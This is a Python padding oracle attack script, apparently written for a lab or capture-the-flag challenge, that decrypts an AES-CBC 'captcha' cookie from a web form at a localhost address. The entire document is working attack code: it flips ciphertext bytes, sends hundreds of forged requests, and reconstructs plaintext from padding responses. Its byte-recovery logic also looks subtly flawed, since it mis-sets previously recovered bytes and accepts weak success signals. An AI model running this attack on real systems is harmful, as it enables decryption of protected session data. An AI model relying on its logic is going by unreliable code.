import requests
import base64
import sys
import time

# Configuration
BASE_URL = "http://127.0.0.1:32834"
COOKIE_VALUE = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="
BLOCK_SIZE = 16  # AES block size

# Create session
session = requests.Session()

# First, get the initial page to see the form and get CSRF token
print("[+] Fetching initial page to extract CSRF token...")
response = session.get(BASE_URL)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response length: {len(response.text)} bytes")

# Look for CSRF token in response
import re
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', response.text)
if csrf_match:
    csrf_token = csrf_match.group(1)
    print(f"[+] CSRF token found: {csrf_token}")
else:
    print("[-] CSRF token not found in response")
    csrf_token = ""

# Decode the base64 cookie
ciphertext = base64.b64decode(COOKIE_VALUE)
print(f"\n[+] Original ciphertext length: {len(ciphertext)} bytes")
print(f"[+] Raw ciphertext (hex): {ciphertext.hex()}")

# Split into blocks
blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
print(f"[+] Number of blocks: {len(blocks)}")
for i, block in enumerate(blocks):
    print(f"  Block {i}: {block.hex()}")

def test_padding(modified_cookie):
    """Test if a modified cookie produces valid padding"""
    try:
        # Set the modified captcha cookie
        cookies = {'captcha': modified_cookie}
        
        # Send POST request with the modified cookie
        # We don't need to send all form fields, just need to trigger padding validation
        data = {
            'csrf_token': csrf_token,
            'username': 'test',
            'captcha': 'test',
            'submit': 'Submit'
        }
        
        response = session.post(BASE_URL, data=data, cookies=cookies, timeout=10)
        
        # Return response text and status to analyze
        return response.status_code, response.text
    except Exception as e:
        print(f"[-] Error in request: {e}")
        return None, str(e)

def decrypt_block(block_index):
    """
    Decrypt a block using padding oracle attack
    block_index: index of the block to decrypt (starting from 1 for the second block)
    """
    if block_index >= len(blocks):
        return b''
    
    print(f"\n{'='*60}")
    print(f"[*] Decrypting block {block_index}")
    print(f"{'='*60}")
    
    # We're decrypting block_index, using block_index-1 as the IV
    prev_block = bytearray(blocks[block_index - 1])
    target_block = blocks[block_index]
    
    decrypted = bytearray(BLOCK_SIZE)
    padding_value = 1
    
    # Start from the last byte and move backwards
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        print(f"\n[*] Working on byte position {byte_pos} (padding value: {padding_value})")
        
        # Save original byte value
        original_byte = prev_block[byte_pos]
        
        found = False
        
        # Try all possible values for this byte (0-255)
        for guess in range(256):
            # Set up the previous block with proper padding
            prev_block[byte_pos] = guess
            
            # Set padding for already decrypted bytes
            for i in range(BLOCK_SIZE - 1, byte_pos, -1):
                prev_block[i] = decrypted[i] ^ padding_value
            
            # Create modified ciphertext
            modified_ciphertext = bytes(prev_block) + target_block
            modified_cookie = base64.b64encode(modified_ciphertext).decode()
            
            if guess % 50 == 0 and guess > 0:
                print(f"  Tried {guess}/256 values...", end='\r')
            
            # Test with the oracle
            status_code, response_text = test_padding(modified_cookie)
            
            # Look for indicators of valid padding
            # Common indicators: no error, different response length, specific error message
            if status_code == 200 and 'padding' not in response_text.lower():
                # This might indicate valid padding
                # We need to verify by checking if it consistently works
                # For now, we'll use a heuristic
                
                # Calculate what the decrypted byte would be
                decrypted_byte = guess ^ padding_value ^ original_byte
                
                # Special case for the first padding byte (should be 0x01)
                if padding_value == 1:
                    # We found a candidate, let's verify
                    print(f"\n  [+] Found candidate: decrypted_byte = {decrypted_byte:02x}")
                    
                    # Quick verification by checking if the padding is consistent
                    # Modify the previous byte and see if it still works
                    if byte_pos > 0:
                        prev_block_copy = bytearray(prev_block)
                        prev_block_copy[byte_pos - 1] = (prev_block_copy[byte_pos - 1] + 1) % 256
                        
                        modified_ct_verify = bytes(prev_block_copy) + target_block
                        modified_cookie_verify = base64.b64encode(modified_ct_verify).decode()
                        
                        status_verify, _ = test_padding(modified_cookie_verify)
                        
                        if status_verify != 200:
                            # If this breaks it, our guess is likely correct
                            decrypted[byte_pos] = decrypted_byte
                            found = True
                            break
                        else:
                            continue  # Try next guess
                    else:
                        decrypted[byte_pos] = decrypted_byte
                        found = True
                        break
                else:
                    # For other padding values, we'll assume correct if status is 200
                    decrypted[byte_pos] = decrypted_byte
                    found = True
                    break
        
        if not found:
            print(f"  [-] Could not find correct byte value")
            # Continue anyway with best guess
        
        # Restore original byte
        prev_block[byte_pos] = original_byte
        
        # Increment padding value for next byte
        padding_value += 1
        if padding_value > BLOCK_SIZE:
            padding_value = BLOCK_SIZE
    
    return bytes(decrypted)

# Decrypt all blocks
print(f"\n{'='*60}")
print(f"[*] Starting Padding Oracle Attack")
print(f"[*] This may take several minutes...")
print(f"{'='*60}")

all_decrypted = b''

# Start from block 1 (first block after IV)
for i in range(1, len(blocks)):
    decrypted_block = decrypt_block(i)
    all_decrypted += decrypted_block
    print(f"\n[+] Decrypted block {i}: {decrypted_block.hex()} | {decrypted_block}")

# The first block (IV) typically contains metadata, we're interested in the decrypted data
print(f"\n{'='*60}")
print(f"[*] FINAL DECRYPTED DATA")
print(f"{'='*60}")
print(f"[+] Decrypted (hex): {all_decrypted.hex()}")
print(f"[+] Decrypted (raw): {all_decrypted}")

# Try to interpret as text
try:
    text_decrypted = all_decrypted.decode('utf-8', errors='ignore')
    print(f"[+] Decrypted (text): {text_decrypted}")
except:
    pass

# Try to remove PKCS7 padding
if len(all_decrypted) > 0:
    # Check last byte for padding value
    last_byte = all_decrypted[-1]
    if 1 <= last_byte <= BLOCK_SIZE:
        # Check if padding is valid
        is_valid_padding = True
        for i in range(1, last_byte + 1):
            if all_decrypted[-i] != last_byte:
                is_valid_padding = False
                break
        
        if is_valid_padding:
            unpadded = all_decrypted[:-last_byte]
            print(f"[+] Unpadded data: {unpadded}")
            try:
                print(f"[+] Unpadded (text): {unpadded.decode('utf-8', errors='ignore')}")
            except:
                pass

print(f"\n[+] Attack completed!")
